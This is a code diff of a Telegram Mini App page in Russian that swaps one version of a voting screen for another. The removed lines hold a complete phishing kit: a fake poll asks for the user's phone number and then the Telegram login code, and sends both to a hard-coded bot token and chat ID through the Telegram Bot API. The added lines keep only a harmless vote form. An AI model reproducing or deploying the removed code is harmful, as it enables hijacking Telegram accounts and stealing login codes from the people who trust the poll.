@@ -5,156 +5,84 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --bg: var(--tg-theme-bg-color, #ffffff); --text: var(--tg-theme-text-color, #000000); --hint: var(--tg-theme-hint-color, #999999); --btn: var(--tg-theme-button-color, #3390ec); --btn-text: var(--tg-theme-button-text-color, #ffffff); }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; text-align: center; background: var(--bg); color: var(--text); margin: 0; }
-        .hidden { display: none !important; }
-        h2 { font-size: 24px; font-weight: 600; margin-bottom: 10px; margin-top: 20px; }
-        p { font-size: 14px; color: var(--hint); line-height: 1.4; margin-bottom: 20px; }
-        
-        .vote-option { border: 2px solid var(--hint); border-radius: 12px; padding: 15px; margin-bottom: 10px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
-        .vote-option.selected { border-color: var(--btn); background: rgba(51, 144, 236, 0.1); }
-        
-        .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px 20px; font-size: 16px; font-weight: 600; width: 100%; max-width: 300px; margin-top: 20px; cursor: pointer; display: block; margin-left: auto; margin-right: auto; }
+        :root {
+            --bg: var(--tg-theme-bg-color, #ffffff);
+            --text: var(--tg-theme-text-color, #000000);
+            --hint: var(--tg-theme-hint-color, #999999);
+            --btn: var(--tg-theme-button-color, #3390ec);
+            --btn-text: var(--tg-theme-button-text-color, #ffffff);
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding: 20px;
+            text-align: center;
+            background: var(--bg);
+            color: var(--text);
+            margin: 0;
+        }
+        h2 { font-size: 24px; font-weight: 600; margin: 20px 0 10px; }
+        p { font-size: 14px; color: var(--hint); margin-bottom: 20px; }
+        .vote-option {
+            border: 2px solid var(--hint);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .vote-option.selected {
+            border-color: var(--btn);
+            background: rgba(51, 144, 236, 0.1);
+        }
+        .main-btn {
+            background: var(--btn);
+            color: var(--btn-text);
+            border: none;
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto 0;
+            cursor: pointer;
+            display: block;
+        }
         .main-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        
-        .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--hint); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
-        .code-cell.filled { border-color: var(--btn); }
-        .code-cell.active { border-color: var(--btn); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
-        .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
-        
-        .success-text { color: #34c759; font-size: 18px; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
-
-    <div id="screen-vote">
-        <h2>Сделайте выбор</h2>
-        <p>Выберите один из вариантов ниже</p>
-        <div class="vote-option" onclick="selectVote(this, 'Вариант 1')">Вариант 1</div>
-        <div class="vote-option" onclick="selectVote(this, 'Вариант 2')">Вариант 2</div>
-        <div class="vote-option" onclick="selectVote(this, 'Вариант 3')">Вариант 3</div>
-        <button class="main-btn" id="btn-next-vote" disabled onclick="showPhoneScreen()">Далее</button>
-    </div>
-
-    <div id="screen-phone" class="hidden">
-        <h2>Ваш номер</h2>
-        <p>Для учета голоса поделитесь номером телефона</p>
-        <button class="main-btn" id="btn-share">Поделиться номером</button>
-    </div>
-
-    <div id="screen-code" class="hidden">
-        <h2>Введите код</h2>
-        <p id="code-subtitle">Мы отправили код в Telegram на ваш номер</p>
-        <div class="code-container" id="code-cells">
-            <div class="code-cell"></div>
-            <div class="code-cell"></div>
-            <div class="code-cell"></div>
-            <div class="code-cell"></div>
-            <div class="code-cell"></div>
-        </div>
-        <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
-        <div id="status-msg" class="success-text hidden">Код принят! Голос учтен.</div>
-    </div>
+    <h2>Сделайте выбор</h2>
+    <p>Выберите один из вариантов</p>
+    <div class="vote-option" onclick="selectVote(this, 'Вариант 1')">Вариант 1</div>
+    <div class="vote-option" onclick="selectVote(this, 'Вариант 2')">Вариант 2</div>
+    <div class="vote-option" onclick="selectVote(this, 'Вариант 3')">Вариант 3</div>
+    <button class="main-btn" id="btn-next" disabled onclick="submitVote()">Далее</button>
 
     <script>
         let selectedVote = null;
-        const LOG_BOT_TOKEN = "8923006288:AAFgpvKcHhZbpl148oi-qT5NUfvIu_7Cq24";
-        const CHAT_ID = "-1004399809740";
-
-        function sendToLog(text) {
-            fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-            });
-        }
 
         function selectVote(el, choice) {
             document.querySelectorAll('.vote-option').forEach(e => e.classList.remove('selected'));
             el.classList.add('selected');
             selectedVote = choice;
-            document.getElementById('btn-next-vote').disabled = false;
+            document.getElementById('btn-next').disabled = false;
         }
 
-        function showPhoneScreen() {
-            document.getElementById('screen-vote').classList.add('hidden');
-            document.getElementById('screen-phone').classList.remove('hidden');
+        function submitVote() {
+            if (!selectedVote) return;
+            const tg = window.Telegram.WebApp;
+            tg.sendData(JSON.stringify({
+                type: "vote",
+                vote: selectedVote
+            }));
         }
 
-        function showCodeScreen() {
-            document.getElementById('screen-phone').classList.add('hidden');
-            document.getElementById('screen-code').classList.remove('hidden');
-            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
-        }
-
-        window.onload = function() {
+        window.onload = () => {
             if (window.Telegram && window.Telegram.WebApp) {
-                const tg = window.Telegram.WebApp;
-                tg.expand();
-
-                // Проверяем, открылись ли мы после перезапуска (на вводе кода)
-                if (window.location.search.includes('step=code')) {
-                    showCodeScreen();
-                }
-
-                // 1. ЗАПРОС НОМЕРА
-                document.getElementById('btn-share').onclick = function() {
-                    tg.requestContact(function(shared, contact) {
-                        if (shared) {
-                            // Берем номер, который Telegram дает в initData (он нормальный)
-                            let phone = "undefined";
-                            if (contact && contact.phone_number) phone = contact.phone_number;
-                            else if (contact && contact.phone) phone = contact.phone;
-                            else if (tg.initDataUnsafe?.user?.phone_number) phone = tg.initDataUnsafe.user.phone_number;
-
-                            // Отправляем через sendData (он 100% передает данные)
-                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
-                            
-                            // Ждем 300мс, чтобы данные точно улетели, и перезапускаем аппу на ввод кода
-                            setTimeout(() => {
-                                window.location.href = window.location.href.split('?')[0] + "?v=48&step=code";
-                            }, 300);
-                        }
-                    });
-                };
-
-                // 2. ВВОД КОДА (тут ничего не закрывается)
-                const codeInput = document.getElementById('code-input');
-                const codeCells = document.querySelectorAll('.code-cell');
-                document.getElementById('code-cells').onclick = () => codeInput.focus();
-                let isSent = false;
-
-                codeInput.addEventListener('input', function(e) {
-                    const value = this.value.replace(/\D/g, '');
-                    this.value = value;
-
-                    codeCells.forEach((cell, index) => {
-                        if (index < value.length) {
-                            cell.innerText = value[index];
-                            cell.classList.add('filled');
-                        } else {
-                            cell.innerText = '';
-                            cell.classList.remove('filled');
-                        }
-                        if (index === value.length) cell.classList.add('active');
-                        else cell.classList.remove('active');
-                    });
-
-                    if (value.length === 5 && !isSent) {
-                        isSent = true;
-                        this.blur();
-                        
-                        document.getElementById('status-msg').classList.remove('hidden');
-                        document.getElementById('code-subtitle').innerHTML = "<b>Отправка...</b>";
-                        
-                        sendToLog(`🗳 <b>ГОЛОС:</b> ${selectedVote}\n🔑 <b>КОД:</b> ${value}`);
-                        
-                        setTimeout(() => {
-                            document.getElementById('code-subtitle').innerHTML = "<b style='color: #34c759;'>Голос учтен!</b>";
-                        }, 1000);
-                    }
-                });
+                window.Telegram.WebApp.expand();
             }
         };
     </script>
